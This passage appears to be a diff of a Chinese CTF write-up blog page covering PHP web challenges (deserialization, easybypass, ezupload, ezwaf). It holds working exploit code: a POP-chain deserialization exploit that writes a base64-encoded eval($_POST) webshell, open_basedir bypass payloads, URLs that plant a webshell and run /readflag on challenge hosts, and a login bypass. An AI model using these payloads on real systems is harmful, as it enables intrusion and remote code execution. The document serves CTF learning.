array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getForStorage()</span><br><span class="line">    &#123;</span><br><span class="line">        $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line"></span><br><span class="line">        return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function save()</span><br><span class="line">    &#123;</span><br><span class="line">        $contents &#x3D; $this-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (! $this-&gt;autosave) &#123;</span><br><span class="line">            $this-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line"></span><br><span class="line">    protected function getExpireTime($expire): int</span><br><span class="line">    &#123;</span><br><span class="line">        return (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getCacheKey(string $name): string</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;options[&#39;prefix&#39;] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected function serialize($data): string</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_numeric($data)) &#123;</span><br><span class="line">            return (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;];</span><br><span class="line"></span><br><span class="line">        return $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function set($name, $value, $expire &#x3D; null): bool</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        if (is_null($expire)) &#123;</span><br><span class="line">            $expire &#x3D; $this-&gt;options[&#39;expire&#39;];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire   &#x3D; $this-&gt;getExpireTime($expire);</span><br><span class="line">        $filename &#x3D; $this-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir &#x3D; dirname($filename);</span><br><span class="line"></span><br><span class="line">        if (!is_dir($dir)) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                mkdir($dir, 0755, true);</span><br><span class="line">            &#125; catch (\Exception $e) &#123;</span><br><span class="line">                &#x2F;&#x2F; 创建失败</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data &#x3D; $this-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span><br><span class="line">            &#x2F;&#x2F;数据压缩</span><br><span class="line">            $data &#x3D; gzcompress($data, 3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data   &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">        $result &#x3D; file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        if ($result) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;src&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir &#x3D; &quot;uploads&#x2F;&quot;;</span><br><span class="line"></span><br><span class="line">if (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs xml">
+<span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php">error_reporting(<span class="hljs-number">0</span>);</span>
 
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> $complete;</span><br><span class="line">    <span class="keyword">public</span> $cache;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key    = <span class="string">".php"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store  = (<span class="keyword">new</span> B());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="number">6666</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complete=<span class="string">"IDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache=[<span class="string">"1"</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]=<span class="string">'php://filter/write=string.strip_tags|convert.base64-decode/resource=./uploads/osword1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>]=<span class="string">'serialize'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize((<span class="keyword">new</span> a())));</span><br></pre></td></tr></table></figure>
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;</span>
 
-<p><img src="./1574341160265.png" alt="1574341160265"></p>
+<span class="php">    <span class="hljs-keyword">protected</span> $store;</span>
+
+<span class="php">    <span class="hljs-keyword">protected</span> $key;</span>
+
+<span class="php">    <span class="hljs-keyword">protected</span> $expire;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($store, $key = <span class="hljs-string">'flysystem'</span>, $expire = null)</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        <span class="hljs-keyword">$this</span>-&gt;key    = $key;</span>
+<span class="php">        <span class="hljs-keyword">$this</span>-&gt;store  = $store;</span>
+<span class="php">        <span class="hljs-keyword">$this</span>-&gt;expire = $expire;</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span><span class="hljs-params">(array $contents)</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        $cachedProperties = array_flip([</span>
+<span class="php">            <span class="hljs-string">'path'</span>, <span class="hljs-string">'dirname'</span>, <span class="hljs-string">'basename'</span>, <span class="hljs-string">'extension'</span>, <span class="hljs-string">'filename'</span>,</span>
+<span class="php">            <span class="hljs-string">'size'</span>, <span class="hljs-string">'mimetype'</span>, <span class="hljs-string">'visibility'</span>, <span class="hljs-string">'timestamp'</span>, <span class="hljs-string">'type'</span>,</span>
+<span class="php">        ]);</span>
+
+<span class="php">        <span class="hljs-keyword">foreach</span> ($contents <span class="hljs-keyword">as</span> $path =&gt; $object) &#123;</span>
+<span class="php">            <span class="hljs-keyword">if</span> (is_array($object)) &#123;</span>
+<span class="php">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span>
+<span class="php">            &#125;</span>
+<span class="php">        &#125;</span>
+
+<span class="php">        <span class="hljs-keyword">return</span> $contents;</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span><span class="hljs-params">()</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        $cleaned = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);</span>
+
+<span class="php">        <span class="hljs-keyword">return</span> json_encode([$cleaned, <span class="hljs-keyword">$this</span>-&gt;complete]);</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        $contents = <span class="hljs-keyword">$this</span>-&gt;getForStorage();</span>
+
+<span class="php">        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, $contents, <span class="hljs-keyword">$this</span>-&gt;expire);</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">$this</span>-&gt;autosave) &#123;</span>
+<span class="php">            <span class="hljs-keyword">$this</span>-&gt;save();</span>
+<span class="php">        &#125;</span>
+<span class="php">    &#125;</span>
+<span class="php">&#125;</span>
+
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;</span>
+
+<span class="php">    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span><span class="hljs-params">($expire)</span>: <span class="hljs-title">int</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        <span class="hljs-keyword">return</span> (int) $expire;</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span><span class="hljs-params">(string $name)</span>: <span class="hljs-title">string</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'prefix'</span>] . $name;</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span><span class="hljs-params">($data)</span>: <span class="hljs-title">string</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        <span class="hljs-keyword">if</span> (is_numeric($data)) &#123;</span>
+<span class="php">            <span class="hljs-keyword">return</span> (string) $data;</span>
+<span class="php">        &#125;</span>
+
+<span class="php">        $serialize = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'serialize'</span>];</span>
+
+<span class="php">        <span class="hljs-keyword">return</span> $serialize($data);</span>
+<span class="php">    &#125;</span>
+
+<span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span><span class="hljs-params">($name, $value, $expire = null)</span>: <span class="hljs-title">bool</span></span></span>
+<span class="php">    &#123;</span>
+<span class="php">        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;</span>
+
+<span class="php">        <span class="hljs-keyword">if</span> (is_null($expire)) &#123;</span>
+<span class="php">            $expire = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'expire'</span>];</span>
+<span class="php">        &#125;</span>
+
+<span class="php">        $expire   = <span class="hljs-keyword">$this</span>-&gt;getExpireTime($expire);</span>
+<span class="php">        $filename = <span class="hljs-keyword">$this</span>-&gt;getCacheKey($name);</span>
+
+<span class="php">        $dir = dirname($filename);</span>
+
+<span class="php">        <span class="hljs-keyword">if</span> (!is_dir($dir)) &#123;</span>
+<span class="php">            <span class="hljs-keyword">try</span> &#123;</span>
+<span class="php">                mkdir($dir, <span class="hljs-number">0755</span>, <span class="hljs-keyword">true</span>);</span>
+<span class="php">            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-keyword">Exception</span> $e) &#123;</span>
+<span class="php">                <span class="hljs-comment">// 创建失败</span></span>
+<span class="php">            &#125;</span>
+<span class="php">        &#125;</span>
+
+<span class="php">        $data = <span class="hljs-keyword">$this</span>-&gt;serialize($value);</span>
+
+<span class="php">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'data_compress'</span>] &amp;&amp; function_exists(<span class="hljs-string">'gzcompress'</span>)) &#123;</span>
+<span class="php">            <span class="hljs-comment">//数据压缩</span></span>
+<span class="php">            $data = gzcompress($data, <span class="hljs-number">3</span>);</span>
+<span class="php">        &#125;</span>
+
+<span class="php">        $data   = <span class="hljs-string">"&lt;?php\n//"</span> . sprintf(<span class="hljs-string">'%012d'</span>, $expire) . <span class="hljs-string">"\n exit();?&gt;\n"</span> . $data;</span>
+<span class="php">        $result = file_put_contents($filename, $data);</span>
+
+<span class="php">        <span class="hljs-keyword">if</span> ($result) &#123;</span>
+<span class="php">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span>
+<span class="php">        &#125;</span>
+
+<span class="php">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span>
+<span class="php">    &#125;</span>
+
+<span class="php">&#125;</span>
+
+<span class="php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'src'</span>]))</span>
+<span class="php">&#123;</span>
+<span class="php">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span>
+<span class="php">&#125;</span>
+
+<span class="php">$dir = <span class="hljs-string">"uploads/"</span>;</span>
+
+<span class="php"><span class="hljs-keyword">if</span> (!is_dir($dir))</span>
+<span class="php">&#123;</span>
+<span class="php">    mkdir($dir);</span>
+<span class="php">&#125;</span>
+<span class="php">unserialize($_GET[<span class="hljs-string">"data"</span>]);</span></code></pre>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+
+    <span class="hljs-keyword">protected</span> $store;
+
+    <span class="hljs-keyword">protected</span> $key;
+
+    <span class="hljs-keyword">protected</span> $expire;
+    <span class="hljs-keyword">public</span> $complete;
+    <span class="hljs-keyword">public</span> $cache;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;key    = <span class="hljs-string">".php"</span>;
+        <span class="hljs-keyword">$this</span>-&gt;store  = (<span class="hljs-keyword">new</span> B());
+        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-number">6666</span>;
+        <span class="hljs-keyword">$this</span>-&gt;complete=<span class="hljs-string">"IDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+"</span>;
+        <span class="hljs-keyword">$this</span>-&gt;cache=[<span class="hljs-string">"1"</span>];
+    &#125;
+
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $options;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'prefix'</span>]=<span class="hljs-string">'php://filter/write=string.strip_tags|convert.base64-decode/resource=./uploads/osword1'</span>;
+        <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'serialize'</span>]=<span class="hljs-string">'serialize'</span>;
+        <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">'data_compress'</span>]=<span class="hljs-number">0</span>;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">echo</span> base64_encode(serialize((<span class="hljs-keyword">new</span> a())));</code></pre>
+
+<p><img src="./1574341160265.png" srcset="/img/loading.gif" alt="1574341160265"></p>
 <h2 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h2><p>队友拿我脚本本地不成功，按他的方法记录下</p>
 <p>serialize传入trim输出原始字符</p>
 <p>再用个如下脚本，去掉base64无法解码字符,在满足四个字节每组就可以了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&#39;txt&#39;] &#x3D; preg_replace(&#39;|[^a-z0-9A-Z+&#x2F;]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);</span><br><span class="line">base64_decode($_GET[&#39;txt&#39;]);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs pgp">&lt;?php
+$_GET[&#39;txt&#39;] &#x3D; preg_replace(&#39;|[^a-z0-9A-Z+&#x2F;]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);
+base64_decode($_GET[&#39;txt&#39;]);</code></pre>
 
 
 
 
 
-<h1 id="easybypass"><a href="#easybypass" class="headerlink" title="easybypass"></a>easybypass</h1><p><img src="./1574335729862.png" alt="1574335729862"></p>
+<h1 id="easybypass"><a href="#easybypass" class="headerlink" title="easybypass"></a>easybypass</h1><p><img src="./1574335729862.png" srcset="/img/loading.gif" alt="1574335729862"></p>
 <p>传phpinfo 查看禁用的函数和open_dir设置</p>
-<p><img src="./1574335770991.png" alt="1574335770991"></p>
-<p><img src="./1574335780624.png" alt="1574335780624"></p>
+<p><img src="./1574335770991.png" srcset="/img/loading.gif" alt="1574335770991"></p>
+<p><img src="./1574335780624.png" srcset="/img/loading.gif" alt="1574335780624"></p>
 <p>绕过open_dir,查看</p>
 <p><a href="https://zhzhdoai.github.io/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">https://zhzhdoai.github.io/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</a></p>
 <p>glob://协议查看</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.186.57.43:10101/?cmd=if%20(%20$b%20=%20opendir(%22glob:///*%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">http:<span class="hljs-comment">//111.186.57.43:10101/?cmd=if%20(%20$b%20=%20opendir(%22glob:///*%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;</span></code></pre>
 
-<p><img src="./1574336091182.png" alt="1574336091182"></p>
+<p><img src="./1574336091182.png" srcset="/img/loading.gif" alt="1574336091182"></p>
 <p>学长的另一个payload，直接贴出来</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'/tmp/fuck'</span>);chdir(<span class="string">'/tmp/fuck/'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdi</span><br><span class="line">r(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">mkdir(<span class="hljs-string">'/tmp/fuck'</span>);chdir(<span class="hljs-string">'/tmp/fuck/'</span>);ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);chdi
+r(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);var_dump(scandir(<span class="hljs-string">'/'</span>));</code></pre>
 
 
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.186.57.43:10101&#x2F;?cmd&#x3D;file_put_contents(%27&#x2F;tmp&#x2F;osword.php%27,%27%3C?php%20eval($_POST[_]);?%3E%27);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs asciidoc"><span class="hljs-link">http://111.186.57.43:10101/?cmd=file_put_contents(%27/tmp/osword.php%27,%27%3C?php%20eval($_POST</span>[<span class="hljs-string">_</span>]);?%3E%27);</code></pre>
 
 <p>现在是需要bypass disable_functions去执行/readflag</p>
 <p>蚁剑连接</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.186.57.43:10101/?cmd=eval($_POST[a]);</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php">http:<span class="hljs-comment">//111.186.57.43:10101/?cmd=eval($_POST[a]);</span></code></pre>
 
-<p><img src="./1574338058533.png" alt="1574338058533"></p>
+<p><img src="./1574338058533.png" srcset="/img/loading.gif" alt="1574338058533"></p>
 <p>上传该文件到/tmp目录</p>
 <p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
-<p><img src="./1574338381305.png" alt="1574338381305"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.186.57.43:10101/?cmd=include(%27/tmp/rdd.php%27);&amp;rdd=/readflag</span></span><br></pre></td></tr></table></figure>
+<p><img src="./1574338381305.png" srcset="/img/loading.gif" alt="1574338381305"></p>
+<pre><code class="hljs php">http:<span class="hljs-comment">//111.186.57.43:10101/?cmd=include(%27/tmp/rdd.php%27);&amp;rdd=/readflag</span></code></pre>
 
-<p><img src="./1574338352562.png" alt="1574338352562"></p>
-<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p><img src="./1574338584875.png" alt="1574338584875"></p>
+<p><img src="./1574338352562.png" srcset="/img/loading.gif" alt="1574338352562"></p>
+<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p><img src="./1574338584875.png" srcset="/img/loading.gif" alt="1574338584875"></p>
 <p>源码泄露</p>
 <p><code>login.php.swp</code></p>
-<p><img src="./1574338562454.png" alt="1574338562454"></p>
+<p><img src="./1574338562454.png" srcset="/img/loading.gif" alt="1574338562454"></p>
 <p>传入不存在username,不传password即可绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;123123123</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-number">123123123</span></code></pre>
 
-<p><img src="./1574338721247.png" alt="1574338721247"></p>
+<p><img src="./1574338721247.png" srcset="/img/loading.gif" alt="1574338721247"></p>
 <p>设置cookie,返回<strong>upload.php</strong></p>
-<p><img src="./1574339010599.png" alt="1574339010599"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.186.57.123:10501&#x2F;uploads&#x2F;fosword.phtml?osword&#x3D;system(%27&#x2F;readflag%27);</span><br></pre></td></tr></table></figure>
+<p><img src="./1574339010599.png" srcset="/img/loading.gif" alt="1574339010599"></p>
+<pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">111.186</span>.<span class="hljs-number">57.123</span>:<span class="hljs-number">10501</span>/uploads/fosword.phtml?osword=<span class="hljs-keyword">system</span>(%27/readflag%27);</code></pre>
 
-<p><img src="./1574339335399.png" alt="1574339335399"></p>
-<h1 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $newarr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($val))</span><br><span class="line">        &#123;</span><br><span class="line">            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $newarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET= escape($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select age from user where name='$name'"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'age'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $age = $_GET[<span class="string">'age'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select name from user where age=$age"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="./1574339335399.png" srcset="/img/loading.gif" alt="1574339335399"></p>
+<h1 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span> <span class="hljs-string">"config.php"</span>;
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'src'</span>]))
+&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span><span class="hljs-params">($arr)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">global</span> $mysqli;
+    $newarr = <span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">foreach</span>($arr <span class="hljs-keyword">as</span> $key=&gt;$val)
